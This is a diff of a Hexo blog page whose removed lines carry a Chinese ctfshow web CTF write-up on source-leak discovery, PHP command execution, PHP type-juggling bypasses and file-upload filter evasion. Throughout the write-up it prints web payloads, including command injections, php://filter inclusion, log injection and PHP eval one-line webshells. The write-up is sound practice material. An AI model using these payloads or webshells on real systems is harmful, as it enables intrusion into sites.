@@ -1,513 +1,241 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-  <meta charset="utf-8">
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+  <meta name="theme-color" content="#3367D6"/>
+  <link rel="apple-touch-icon" href="/icons-192.png">
+  <link rel="manifest" href="/manifest.json">
   
+  <meta name="generator" content="Hexo 7.1.1">
+
   
+    <meta name="description" content="hello pq">
+  
+
+  
+
+  
+    <meta name="author" content="steve-pq">
+  
+
+  
+
+  
+
   <title>Hexo</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-  <meta property="og:type" content="website">
-<meta property="og:title" content="Hexo">
-<meta property="og:url" content="http://example.com/index.html">
-<meta property="og:site_name" content="Hexo">
-<meta property="og:locale" content="en_US">
-<meta property="article:author" content="John Doe">
-<meta name="twitter:card" content="summary">
+
   
-    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+
+  
+    <link rel="shortcut icon" href="/favicon.ico">
+  
+
+  <!--mathjax latex数学公式显示支持-->
   
   
-    <link rel="shortcut icon" href="/favicon.png">
+
   
+
   
+
   
 <link rel="stylesheet" href="/css/style.css">
 
-  
-    
-<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
-
-  
-  
-<meta name="generator" content="Hexo 7.1.1"></head>
-
+</head>
 <body>
-  <div id="container">
-    <div id="wrap">
-      <header id="header">
-  <div id="banner"></div>
-  <div id="header-outer" class="outer">
-    <div id="header-title" class="inner">
-      <h1 id="logo-wrap">
-        <a href="/" id="logo">Hexo</a>
-      </h1>
-      
+  <div class="root-container">
+    
+<!-- header container -->
+<header class="header-container">
+  
+    <div class="post-image" style="background-image: url(https://qiniu.sukoshi.xyz/src/images/68686407_p0.jpg)"></div>
+  
+
+  <!-- navbar -->
+<nav class="navbar">
+  <div class="navbar-content">
+    <!-- logo -->
+    <div class="navbar-logo">
+      <a href="/">
+        
+          Hexo
+        
+      </a>
     </div>
-    <div id="header-inner" class="inner">
-      <nav id="main-nav">
-        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
-        
-          <a class="main-nav-link" href="/">Home</a>
-        
-          <a class="main-nav-link" href="/archives">Archives</a>
-        
-      </nav>
-      <nav id="sub-nav">
-        
-        
-          <a class="nav-icon" href="/atom.xml" title="RSS Feed"><span class="fa fa-rss"></span></a>
-        
-        <a class="nav-icon nav-search-btn" title="Search"><span class="fa fa-search"></span></a>
-      </nav>
-      <div id="search-form-wrap">
-        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
+    <!-- link -->
+    <div class="navbar-link">
+      <div class="navbar-btn">
+        <div></div>
+        <div></div>
+        <div></div>
       </div>
-    </div>
-  </div>
-</header>
-
-      <div class="outer">
-        <section id="main">
-  
-    <article id="post-ctfshow WEB入门" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2024/03/18/ctfshow%20WEB%E5%85%A5%E9%97%A8/" class="article-date">
-  <time class="dt-published" datetime="2024-03-17T23:30:35.016Z" itemprop="datePublished">2024-03-18</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h1 id="ctfshow-WEB入门"><a href="#ctfshow-WEB入门" class="headerlink" title="ctfshow WEB入门"></a>ctfshow WEB入门</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>最简单的就是从包，源码及里面的注释寻找flag。</p>
-<p>重点是以下几个：</p>
-<h3 id="phps文件泄露"><a href="#phps文件泄露" class="headerlink" title="phps文件泄露"></a>phps文件泄露</h3><p>phps存放着php源码，可以使用url&#x2F;index.phps访问，或者使用扫描工具。但是PHP版本须小于等于7.4.21。</p>
-<h3 id="www源码泄露"><a href="#www源码泄露" class="headerlink" title="www源码泄露"></a>www源码泄露</h3><blockquote>
-<p>网站备份压缩文件 漏洞成因</p>
-<p>在网站的升级和维护过程中，通常需要对网站中的文件进行修改。此时就需要对网站整站或者其中某一页面进行备份。</p>
-<p>当备份文件或者修改过程中的缓存文件因为各种原因而被留在网站 web 目录下，而该目录又没有设置访问权限时，便有可能导致备份文件或者编辑器的缓存文件被下载，导致敏感信息泄露，给服务器的安全埋下隐患。</p>
-<p>该漏洞的成因主要有是管理员将备份文件放在到 web 服务器可以访问的目录下。</p>
-<p>该漏洞往往会导致服务器整站源代码或者部分页面的源代码被下载，利用。源代码中所包含的各类敏感信息，如服务器数据库连接信息，服务器配置信息等会因此而泄露，造成巨大的损失。</p>
-<p>被泄露的源代码还可能会被用于代码审计，进一步利用而对整个系统的安全埋下隐患。</p>
-<p>.rar .zip .7z .tar.gz .bak .swp .txt</p>
-</blockquote>
-<p>示例：url&#x2F;<a target="_blank" rel="noopener" href="http://www.zip/">www.zip</a></p>
-<h3 id="git文件泄露"><a href="#git文件泄露" class="headerlink" title=".git文件泄露"></a>.git文件泄露</h3><blockquote>
-<p>.git文件夹是Git版本控制系统中存储仓库信息的核心文件夹。这个文件夹包含了版本历史、分支、标签和配置等信息。当.git文件夹泄露时，可能会导致严重的安全问题，因为攻击者可以获得有关项目所有历史和当前状态的敏感信息。</p>
-</blockquote>
-<p>示例：url&#x2F;.git</p>
-<h3 id="svn文件泄露"><a href="#svn文件泄露" class="headerlink" title=".svn文件泄露"></a>.svn文件泄露</h3><blockquote>
-<p>svn是源代码管理系统，在管理代码的过程中，会生成一个.svn的隐藏文件，导致源码泄露（造成原因是在发布代码时没有使用导入功能，而是直接粘贴复制）</p>
-</blockquote>
-<p>示例：url&#x2F;.svn</p>
-<h3 id="vim缓存泄露"><a href="#vim缓存泄露" class="headerlink" title="vim缓存泄露"></a>vim缓存泄露</h3><blockquote>
-<p>在使用vim进行编辑时，会产生缓存文件，操作正常，则会删除缓存文件，如果意外退出，缓存文件保留下来，这是时可以通过缓存文件来得到原文件，以index.php来说，第一次退出后，缓存文件名为 .index.php.swp，第二次退出后，缓存文件名为.index.php.swo,第三次退出后文件名为.index.php.swn</p>
-</blockquote>
-<p>示例：url&#x2F;.index.php.swp</p>
-<p>另外：压缩文件也可能包含文件的源码等，注意rar zip后缀。</p>
-<p>借鉴文章：</p>
-<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_59950255/article/details/121500183">https://blog.csdn.net/qq_59950255/article/details/121500183</a></p>
-<h2 id="爆破"><a href="#爆破" class="headerlink" title="爆破"></a>爆破</h2><h2 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h2><h3 id="web29"><a href="#web29" class="headerlink" title="web29"></a>web29</h3><p>题目：</p>
-<p><img src="/./pictures/image-20240305083412644.png" alt="image-20240305083412644"></p>
-<p>查看目录：?c&#x3D;system(“ls”);	看到flag.php</p>
-<p>方法一：</p>
-<p>本来我想cat，但是cat的是文本，不是PHP文件，那么可以把PHP文件代码复制到txt文件，再去访问txt文件即可。</p>
-<p>payload：?c&#x3D;system(“cp fla*.php pq.txt”);</p>
-<p>方法二：cat不行，但是tac可以</p>
-<p>payload：?c&#x3D;system(“tac fla*.php”);</p>
-<p>方法三：如果就想写flag也可以，参数限制绕过</p>
-<p>payload：?c&#x3D;eval(“$_GET[a]”);&amp;a&#x3D;system(“tac flag.php”);</p>
-<p>方法四：蚁剑</p>
-<p>?c&#x3D;system(‘echo “<?php eval($_GET[cmd]);?>“ xq.php’)</p>
-<h3 id="web30"><a href="#web30" class="headerlink" title="web30"></a>web30</h3><p>题目：</p>
-<p><img src="/./pictures/image-20240305092037926.png" alt="image-20240305092037926"></p>
-<p>方法一：</p>
-<p>payload：?c&#x3D;eval(“$_GET[a]”);&amp;a&#x3D;system(“ls”);</p>
-<p>方法二：</p>
-<p>尝试使用passthru来替代system执行系统命令，payload：?c&#x3D;passthru(“ls”);</p>
-<h3 id="web31"><a href="#web31" class="headerlink" title="web31"></a>web31</h3><p>题目：</p>
-<p><img src="/./pictures/image-20240305225850918.png" alt="image-20240305225850918"></p>
-<p>方法一：</p>
-<p>payload：?c&#x3D;eval(“$_GET[a]”);&amp;a&#x3D;system(“ls”);</p>
-<p>方法二：</p>
-<p>payload：?c&#x3D;passthru(“tac%09fla*”);</p>
-<p>%09，水平制表符</p>
-<p>方法三：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=show_source(next(array_reverse(scandir(pos(localeconv())))));</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<ol>
-<li><code>localeconv()</code> 函数返回当前设置的地区设置的格式信息。它通常用于获取货币和数字格式等本地化设置。</li>
-<li><code>pos(localeconv())</code> 返回地区设置中的正数格式字符串。</li>
-<li><code>scandir()</code> 函数返回指定目录中的文件和目录列表。</li>
-<li><code>array_reverse()</code> 函数用于将数组中的元素顺序反转。</li>
-<li><code>next()</code> 函数返回数组中的下一个元素，并将数组内部指针向后移动一位。</li>
-<li>最后，<code>show_source()</code> 函数用于显示指定文件的源代码。</li>
-</ol>
-</blockquote>
-<h3 id="web32"><a href="#web32" class="headerlink" title="web32"></a>web32</h3><p>题目：</p>
-<p><img src="/./pictures/image-20240305231757033.png" alt="image-20240305231757033"></p>
-<p>与文件包含有关，先看payload：</p>
-<p>?c&#x3D;include%0a$_GET[1]?%3E&amp;1&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php</p>
-<p>有人给出了相当出色的write up：</p>
-<blockquote>
-<p>参照sdellone的wp，进行了改进和解释</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">c=include%0a$_GET[1]?&gt;&amp;1=php://filter/convert.base64-encode/resource=flag.php #这是sdellone的payload</span><br><span class="line">c=include$_GET[1]?&gt;&amp;1=php://filter/convert.base64-encode/resource=flag.php #这是我的payload</span><br></pre></td></tr></table></figure>
-
-<p>其实两者的差距只在于一个%0a，改不改无所谓，下面解释各成分作用</p>
-<ul>
-<li>首先是include+参数1，作用是包含参数1的文件，运用了文件包含漏洞，最后的文件名字可以改为&#x2F;etc&#x2F;passwd和nginx的日志文件来定位flag位置</li>
-<li>然后是%0a作用，这是url回车符，因为空格被过滤。事实上，删去也无所谓，似乎php会自动给字符串和变量间添加空格（经检验，只在eval中有效，echo中无效，还是得要空格）</li>
-<li>后面的?&gt;的作用是作为绕过分号，作为语句的结束。原理是：php遇到定界符关闭标签会自动在末尾加上一个分号。简单来说，就是php文件中最后一句在?&gt;前可以不写分号。</li>
-<li>在c中引用了参数1，然后&amp;后对参数1定义，运用文件包含漏洞</li>
-</ul>
-</blockquote>
-<h3 id="web33"><a href="#web33" class="headerlink" title="web33"></a>web33</h3><p>题目：</p>
-<p><img src="/./pictures/image-20240306224809787.png" alt="image-20240306224809787"></p>
-<p>这题要细讲：常用方法就不讲了</p>
-<p>参考链接：<a target="_blank" rel="noopener" href="https://ctf.show/writeups/1634136">ctf.show</a></p>
-<p>方法一：php伪协议</p>
-<p>payload：</p>
-<p>?c&#x3D;include$_GET[cmd]?&gt;&amp;cmd&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;recourse&#x3D;flag.php</p>
-<p>或者payload：</p>
-<p>GET：?c&#x3D;include$_GET[cmd]&gt;&amp;cmd&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,<?php echo($_POST[1]);?></p>
-<p>1&#x3D;echo 1;	直接上蚁剑</p>
-<p><img src="/./pictures/image-20240307125625616.png" alt="image-20240307125625616"></p>
-<p>方法二：日志注入</p>
-<p><img src="/./pictures/image-20240308155700613.png"></p>
-<p>在UA中放入一句话木马：<?php @eval($_POST[1]);?></p>
-<h2 id="PHP特性"><a href="#PHP特性" class="headerlink" title="PHP特性"></a>PHP特性</h2><h3 id="web89"><a href="#web89" class="headerlink" title="web89"></a>web89</h3><p>题目：</p>
-<p><img src="/./pictures/image-20240229213733001.png" alt="image-20240229213733001"></p>
-<blockquote>
-<p>preg_match当检测的变量是数组的时候会报错并返回0。而intval函数当传入的变量也是数组的时候，会返回1</p>
-</blockquote>
-<p>payload：num[]&#x3D;1</p>
-<h3 id="web90"><a href="#web90" class="headerlink" title="web90"></a>web90</h3><p>题目：</p>
-<p><img src="/./pictures/image-20240229221110666.png" alt="image-20240229221110666"></p>
-<blockquote>
-<p>intval($var,$base)，其中var必填，base可选，这里base&#x3D;0,则表示根据var开始的数字决定使用的进制： 0x或0X开头使用十六进制，0开头使用八进制，否则使用十进制。 这里&#x3D;&#x3D;&#x3D;表示类型和数值必须相等，我们可以使用4476的八进制或十六进制绕过检测。 </p>
-</blockquote>
-<p>paylod：num&#x3D;010574或num&#x3D;0x117c</p>
-<h3 id="web91"><a href="#web91" class="headerlink" title="web91"></a>web91</h3><p>题目：</p>
-<p><img src="/./pictures/image-20240229222222111.png" alt="image-20240229222222111"></p>
-<p>拓展：</p>
-<blockquote>
-<p>i<br>不区分(ignore)大小写</p>
-<p>m<br>多(more)行匹配<br>若存在换行\n并且有开始^或结束$符的情况下，<br>将以换行为分隔符，逐行进行匹配<br>$str &#x3D; “abc\nabc”;<br>$preg &#x3D; “&#x2F;^abc$&#x2F;m”;<br>preg_match($preg, $str,$matchs);<br>这样其实是符合正则表达式的，因为匹配的时候 先是匹配换行符前面的，接着匹配换行符后面的，两个都是abc所以可以通过正则表达式。</p>
-<p>s<br>特殊字符圆点 . 中包含换行符<br>默认的圆点 . 是匹配除换行符 \n 之外的任何单字符，加上s之后, .包含换行符<br>$str &#x3D; “abggab\nacbs”;<br>$preg &#x3D; “&#x2F;b.&#x2F;s”;<br>preg_match_all($preg, $str,$matchs);<br>这样匹配到的有三个 bg b\n bs</p>
-<p>A<br>强制从目标字符串开头匹配;</p>
-<p>D<br>如果使用$限制结尾字符,则不允许结尾有换行; </p>
-<p>e<br>配合函数preg_replace()使用, 可以把匹配来的字符串当作正则表达式执行; </p>
-</blockquote>
-<p>换行可以绕过，payload：</p>
-<p>cmd&#x3D;%0aphp</p>
-<p>cmd&#x3D;php%0a</p>
-<h3 id="web92"><a href="#web92" class="headerlink" title="web92"></a>web92</h3><p>同web90</p>
-<h3 id="web93"><a href="#web93" class="headerlink" title="web93"></a>web93</h3><p>题目：</p>
-<p><img src="/./pictures/image-20240229222757711.png" alt="image-20240229222757711"></p>
-<p>0x是不能用了，采用八进制</p>
-<p>payload：num&#x3D;010574</p>
-<h3 id="web94"><a href="#web94" class="headerlink" title="web94"></a>web94</h3><p>题目：</p>
-<p><img src="/./pictures/image-20240229223532068.png" alt="image-20240229223532068"></p>
-<p>strpos() 函数查找字符串在另一字符串中第一次出现的位置并返回该位置。</p>
-<p>0不能在开头，有两个方法：</p>
-<p>换行</p>
-<p>payload：?num&#x3D;4476%0a0</p>
-<p>小数点</p>
-<p>payload：?num&#x3D;4476.0</p>
-<h3 id="web95"><a href="#web95" class="headerlink" title="web95"></a>web95</h3><p>题目：</p>
-<p><img src="/./pictures/image-20240229224107713.png" alt="image-20240229224107713"></p>
-<p>不能以进制开头，也不能用换行符，利用八进制开头加号代替空格绕过</p>
-<p>payload：num&#x3D;+010574</p>
-<h3 id="web96"><a href="#web96" class="headerlink" title="web96"></a>web96</h3><p>题目：</p>
-<p><img src="/./pictures/image-20240229224755920.png" alt="image-20240229224755920"></p>
-<p>表示一个文件路径的方法有很多，payload：</p>
-<p>相对路径：.&#x2F;flag.php</p>
-<p>绝对路径：&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php</p>
-<p>PHP伪协议：php:&#x2F;&#x2F;filter&#x2F;source&#x3D;flag.php</p>
-<h3 id="web97"><a href="#web97" class="headerlink" title="web97"></a>web97</h3><p>题目：</p>
-<p><img src="/./pictures/image-20240229230649531.png" alt="image-20240229230649531"></p>
-<p>本题是强比较，payload：a[]&#x3D;1&amp;b[]&#x3D;2</p>
-<p>拓展：</p>
-<p>参考文章：<a target="_blank" rel="noopener" href="https://www.freesion.com/article/53561386476/">CTF中的md5绕过及其他特殊hash值汇总 - 灰信网（软件开发博客聚合） (freesion.com)</a></p>
-<p>弱比较：</p>
-<blockquote>
-<p>php在进行弱类型比较（即&#x3D;&#x3D;)时,会现转换字符串的类型，再进行比较，而在比较是因为两个数都是以0e开头会被认为是科学计数法，0e后面加任何数在科学计数法中都是0，所以两数相等。</p>
-</blockquote>
-<p>选两个md5后是0e开头的即可，参考：<a target="_blank" rel="noopener" href="https://github.com/spaze/hashes/blob/master/md5.md">https://github.com/spaze/hashes/blob/master/md5.md</a></p>
-<p>强比较：</p>
-<blockquote>
-<p>两个md5后的值采用严格比较，没有规定字符串如果这个时候传入的是数组不是字符串，可以利用md5()函数的缺陷进行绕过</p>
-</blockquote>
-<blockquote>
-<p>md5中需要的是一个string参数，但是当你传入一个array(数组)是，md5()是不会报错的，只是无法求出array的md5的值，这样就会导致任意的2个array的md5的值都会相等</p>
-</blockquote>
-<p>md5碰撞：</p>
-<p>题目强制要求变量为字符串，此时只能碰撞了，找样本即可。</p>
-<h3 id="web98"><a href="#web98" class="headerlink" title="web98"></a>web98</h3><p>题目：</p>
-<p><img src="/./pictures/image-20240229232941277.png" alt="image-20240229232941277"></p>
-<p>payload：</p>
-<p><img src="/./pictures/image-20240301223927630.png" alt="image-20240301223927630"></p>
-<p>或者get和post都是：<code>HTTP_FLAG: flag</code></p>
-<h3 id="web99"><a href="#web99" class="headerlink" title="web99"></a>web99</h3><p>题目：</p>
-<p><img src="/./pictures/image-20240301224935590.png" alt="image-20240301224935590"></p>
-<p>payload：</p>
-<p>GET：n&#x3D;1.php</p>
-<p>POST：content&#x3D;<?php eval($_POST['cmd']);?></p>
-<p>转到1.php</p>
-<p>POST：cmd&#x3D;system(‘cat ···’);</p>
-<h3 id="web100"><a href="#web100" class="headerlink" title="web100"></a>web100</h3><p>题目：</p>
-<p><img src="/./pictures/image-20240301231138137.png" alt="image-20240301231138137"></p>
-<p>$v0必须是数字或数字字符串，$v2和$v3要和(‘ctfshow’)构成语句</p>
-<p>payload：</p>
-<p>eval(“var_dump(get_defined_vars())&#x2F;<em>(‘ctfshow’)</em>&#x2F;;”);</p>
-<p>拓展：</p>
-<blockquote>
-<p><code>var_dump(get_defined_vars())</code> 是一个用于调试目的的 PHP 代码片段，它将打印出当前作用域中所有已定义的变量及其值。下面是对该代码的解析：</p>
-<p><code>get_defined_vars()</code> 是一个 PHP 内置函数，返回一个包含当前作用域中所有已定义变量的关联数组。这个数组的键是变量名，值是对应的变量值。</p>
-<p><code>var_dump()</code> 是一个用于打印变量的函数，它以易于阅读的方式输出变量的值和其他相关信息。</p>
-<p>因此，<code>var_dump(get_defined_vars())</code> 的作用是打印出当前作用域中所有已定义变量的名称和值。这对于调试和了解当前代码中的变量状态非常有用。</p>
-</blockquote>
-<p>反正可以用来搞事情</p>
-<h3 id="web101"><a href="#web101" class="headerlink" title="web101"></a>web101</h3><p>题目：</p>
-<p><img src="/./pictures/image-20240301233106804.png" alt="image-20240301233106804"></p>
-<p>思路：</p>
-<p>1.尝试闭合v2，在v3构造：v2&#x3D;echo&amp;v3&#x3D;;[shell];	但是不行</p>
-<p>2.反射类：</p>
-<blockquote>
-<p>涉及到类，可以考虑使用 ReflectionClass 建立反射类。</p>
-<p>new ReflectionClass($class) 可以获得类的反射对象（包含元数据信息）。</p>
-<p>元数据对象（包含class的所有属性&#x2F;方法的元数据信息）。</p>
-</blockquote>
-<p>payload：</p>
-<p>v1&#x3D;1&amp;v2&#x3D;echo new ReflectionClass&amp;v3&#x3D;;</p>
-<p>拓展：</p>
-<blockquote>
-<p>使用 <code>ReflectionClass</code> 对象，可以获取和操作类的各种信息，包括但不限于以下内容：</p>
-<ul>
-<li>类的名称：通过 <code>getName()</code> 方法获取类的名称。</li>
-<li>类的方法：通过 <code>getMethods()</code> 方法获取类的方法列表，可以进一步获取每个方法的名称、参数、访问修饰符等信息。</li>
-<li>类的属性：通过 <code>getProperties()</code> 方法获取类的属性列表，可以进一步获取每个属性的名称、默认值、访问修饰符等信息。</li>
-<li>类的常量：通过 <code>getConstants()</code> 方法获取类的常量列表，可以获取每个常量的名称和值。</li>
-<li>类的接口和父类：通过 <code>getInterfaces()</code> 和 <code>getParentClass()</code> 方法获取类实现的接口和继承的父类。</li>
-<li>类的注释和文档块：通过 <code>getDocComment()</code> 方法获取类的注释和文档块。</li>
-</ul>
-<p>除了获取信息外，<code>ReflectionClass</code> 还提供了一些方法，用于对类进行操作和调用，如实例化类、调用类的方法、设置类的属性值等。</p>
-</blockquote>
-<h3 id="web102-没做出来"><a href="#web102-没做出来" class="headerlink" title="web102 没做出来"></a>web102 没做出来</h3><p>题目：</p>
-<p><img src="/./pictures/image-20240301234256488.png" alt="image-20240301234256488"></p>
-<p>思路：</p>
-<p>$v2必须是数字，在PHP5十六进制字符串被认为是数字，可以通过is_numeric，但是在PHP7不行。</p>
-<p>那么采用base64编码，再利用PHP伪协议解码。</p>
-<p>payload：（目前没做出来）</p>
-<p>v1&#x3D;hex2bin v2&#x3D;225044383959474e6864434171594473 v3&#x3D;php:&#x2F;&#x2F;filter&#x2F;write&#x3D;convert.base64-decode&#x2F;resource&#x3D;2.php</p>
-<p>拓展：</p>
-<blockquote>
-<p><code>is_numeric</code>是一个函数或方法，用于判断一个值是否为数字。它通常用于编程语言中，用于验证用户输入的数据是否为数字类型。</p>
-<p>具体实现和用法可能会根据编程语言的不同而有所不同，但通常情况下，<code>is_numeric</code>会接受一个参数，该参数可以是任何类型的值。函数会检查该值是否可以被解释为数字，如果可以，则返回<code>true</code>，否则返回<code>false</code>。</p>
-</blockquote>
-<h3 id="web103没做"><a href="#web103没做" class="headerlink" title="web103没做"></a>web103没做</h3><h3 id="web104"><a href="#web104" class="headerlink" title="web104"></a>web104</h3><p>题目：</p>
-<p><img src="/./pictures/image-20240302161744253.png" alt="image-20240302161744253"></p>
-<p>payload：</p>
-<p>GET：v2[]&#x3D;1	POST：v1[]&#x3D;1</p>
-<p><img src="/./pictures/image-20240302162429187.png" alt="image-20240302162429187"></p>
-<p>如果使用相同的字符串，哈希以后不爆flag，不懂</p>
-<p>拓展：</p>
-<blockquote>
-<p>sha1无法处理数组，如下可使用a[]&#x3D;1&amp;b[]&#x3D;1数组绕过</p>
-</blockquote>
-<h3 id="web105"><a href="#web105" class="headerlink" title="web105"></a>web105</h3><p>题目：</p>
-<p><img src="/./pictures/image-20240302163540334.png" alt="image-20240302163540334"></p>
-<p>思路：$flag变量是已经有的，但是我双写以后为flag带上$，与先前的$flag等同，为了让<code>!($_POST[&#39;flag&#39;]==$flag)</code>失败，</p>
-<p>我想在POST里flag: ex，这样会导致$flag&#x3D;$ex，$flag值变了万万不可（无论在GET还是POST，flag都只能是值），那么flag必须是键值对的值，借助GET，payload：</p>
-<p>?suces&#x3D;flag，post：error&#x3D;suces</p>
-<p>不知道为什么就是不能成功</p>
-<h3 id="web106"><a href="#web106" class="headerlink" title="web106"></a>web106</h3><p>题目：</p>
-<p><img src="/./pictures/image-20240302173837129.png" alt="image-20240302173837129"></p>
-<p>同web104，这里拓展一点：</p>
-<blockquote>
-<p>但MD5或者sha1这种如果强制类型转换后，就不接受数组了，这个时候就要找真正的编码后相同的了，如</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">aaroZmOk`</span><br><span class="line">`aaK1STfY`</span><br><span class="line">`aaO8zKZF`</span><br><span class="line">`aa3OFF9m</span><br></pre></td></tr></table></figure>
-</blockquote>
-<h3 id="web107"><a href="#web107" class="headerlink" title="web107"></a>web107</h3><p>题目：</p>
-<p><img src="/./pictures/image-20240302175730190.png" alt="image-20240302175730190"></p>
-<p>无需多言：（第十三行下面不能多行）</p>
-<p><img src="/./pictures/image-20240302175708676.png" alt="image-20240302175708676"></p>
-<p>拓展：</p>
-<p>parse_str函数：可以将查询字符串解析为 PHP 变量，并在第二个参数（数组）里存储，语法如下：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">parse_str</span>(<span class="variable">$queryString</span>, <span class="variable">$params</span>);</span><br></pre></td></tr></table></figure>
-
-<h3 id="web108"><a href="#web108" class="headerlink" title="web108"></a>web108</h3><p>题目：</p>
-<p><img src="/./pictures/image-20240302175907819.png" alt="image-20240302175907819"></p>
-<p>采用ereg函数的%00截断漏洞，payload：</p>
-<p>?c&#x3D;a%00778</p>
-<p>拓展：</p>
-<blockquote>
-<ol>
-<li><code>ereg</code> 函数：<ul>
-<li><code>ereg</code> 函数是一个正则表达式匹配函数，用于在字符串中搜索模式并返回匹配的位置。然而，需要注意的是，<code>ereg</code> 函数在 PHP 5.3.0 版本中已被弃用，并且在 PHP 7.0.0 版本中被移除。因此，不建议在新的 PHP 项目中使用 <code>ereg</code> 函数。推荐使用 <code>preg_match</code> 函数来执行正则表达式匹配操作。</li>
-</ul>
-</li>
-<li><code>intval</code> 函数：<ul>
-<li><code>intval</code> 函数用于将变量的值转换为整数。它接受一个参数，即要转换的变量。如果变量是一个字符串，它会尝试将字符串转换为整数。如果变量是一个浮点数，它会将浮点数截断为整数。如果变量是一个布尔值，<code>intval</code> 函数会将 <code>true</code> 转换为 1，将 <code>false</code> 转换为 0。如果变量无法转换为整数，<code>intval</code> 函数会返回 0。</li>
-</ul>
-</li>
-<li><code>strrev</code> 函数：<ul>
-<li><code>strrev</code> 函数用于将字符串反转。它接受一个参数，即要反转的字符串，并返回反转后的字符串。例如，如果输入字符串是 “Hello”，则 <code>strrev</code> 函数将返回 “olleH”。</li>
-</ul>
-</li>
-</ol>
-</blockquote>
-<blockquote>
-<p>ereg有两个漏洞：</p>
-<p>  ①%00截断及遇到%00则默认为字符串的结束</p>
-<p>  ②当ntf为数组时它的返回值不是FALSE</p>
-</blockquote>
-<h3 id="web109"><a href="#web109" class="headerlink" title="web109"></a>web109</h3><p>题目：</p>
-<p><img src="/./pictures/image-20240302181220984.png" alt="image-20240302181220984"></p>
-<p>用几种思路：</p>
-<p>1.隔离语句：</p>
-<p>?v1&#x3D;Exception();system(“ls”);&#x2F;&#x2F;&amp;v2&#x3D;a</p>
-<p>2.反射对象：</p>
-<p>v1&#x3D;ReflectionClass&amp;v2&#x3D;system(“ls”)</p>
-<p>v1&#x3D;ReflectionClass(“PDO”);system(“ls”);	这个尽量别用</p>
-<h3 id="web110"><a href="#web110" class="headerlink" title="web110"></a>web110</h3><p>题目：</p>
-<p><img src="/./pictures/image-20240302183906925.png" alt="image-20240302183906925"></p>
-<p>一看就很不爽</p>
-<h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><h3 id="web151"><a href="#web151" class="headerlink" title="web151"></a>web151</h3><p>没什么限制。</p>
-<p>先用记事本写一个一句话木马，后缀是png，文件上传后抓包，filename改一下后缀为php，木马目录是&#x2F;upload&#x2F;pq.php，上蚁剑</p>
-<h3 id="web152"><a href="#web152" class="headerlink" title="web152"></a>web152</h3><p>后端检查MIME，改成image&#x2F;png，就本题而言文件名应该不用改（我没试过）</p>
-<h3 id="web153"><a href="#web153" class="headerlink" title="web153"></a>web153</h3><p>.user.ini文件解析png文件于upload&#x2F;index.php之前：</p>
-<p>auto_prepend_file&#x3D;test1.png</p>
-<p>test1.png会被当做test1.php执行，所以在test1.php里写入木马</p>
-<p>蚁剑连upload&#x2F;index.php</p>
-<h3 id="web154"><a href="#web154" class="headerlink" title="web154"></a>web154</h3><p>黑名单过滤，过滤了php后缀，还有包涵php内容的文件，用大小写绕过即可</p>
-<p><code>&lt;?PHp @eval($_POST[cmd]);?&gt;</code></p>
-<p>须知：php文件内容改掉大小写依旧生效，除变量外，如&lt;?php相当&lt;?Php</p>
-<h3 id="web155"><a href="#web155" class="headerlink" title="web155"></a>web155</h3><p>上一题区分大小写，这一题不区分，直接过滤，使用PHP短标签</p>
-<p><code>&lt;?= @eval($_POST[cmd]);?&gt;</code></p>
-<h3 id="web156"><a href="#web156" class="headerlink" title="web156"></a>web156</h3><p>比上题还多了[]过滤，换用大括号。</p>
-<h3 id="web157"><a href="#web157" class="headerlink" title="web157"></a>web157</h3><p>过滤了{}，[]，;</p>
-<p>木马的作用是执行命令，那我们可以在重放器里执行</p>
-<? system(“tac ../flag*”)?>
-
-<h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>关于黑名单绕过这部分有一些常识和拓展</p>
-<h4 id="常识"><a href="#常识" class="headerlink" title="常识"></a>常识</h4><h5 id="大小写问题"><a href="#大小写问题" class="headerlink" title="大小写问题"></a>大小写问题</h5><p>php除了变量之类，一般对大小写不敏感</p>
-<h5 id="标签绕过"><a href="#标签绕过" class="headerlink" title="标签绕过"></a>标签绕过</h5><p>php标签写法：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/meng-han/p/16759747.html">PHP标签写法 - hithub - 博客园 (cnblogs.com)</a>，</p>
-<p>一般是短标签：<code>&lt;? sentences;?&gt;</code></p>
-<p>如果过滤了<code>&lt;?</code>，在PHP7.0以下可以使用：</p>
-<script language="php">sentences</script> #不需要修改参数开关，但是只能在7.0以下可用。
-
